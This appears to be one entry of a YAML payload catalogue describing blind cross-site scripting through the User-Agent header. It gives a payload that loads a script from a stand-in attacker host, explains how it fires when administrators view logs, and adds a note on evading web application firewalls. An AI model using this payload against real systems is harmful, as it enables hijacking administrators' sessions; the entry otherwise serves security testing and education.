  - id: xss-blind-003
    title: Blind XSS via User-Agent header
    payload_string: '"><script src=https://attacker.com/blind.js></script>'
    how_it_works: 'The User-Agent header is frequently logged and displayed in analytics dashboards, access log viewers, and
      support tools without HTML encoding. An attacker sends a request with a crafted User-Agent containing an XSS payload.
      When a developer or administrator views the logs in a web-based log viewer, the payload fires with their session privileges.
      This is a classic blind XSS vector that bypasses application input validation on form fields entirely.

      '
    prerequisites:
    - Application logs User-Agent and renders it in web-based log viewer
    - Log viewer does not HTML-encode User-Agent values
    waf_bypass_notes: User-Agent field rarely inspected by application WAF for XSS
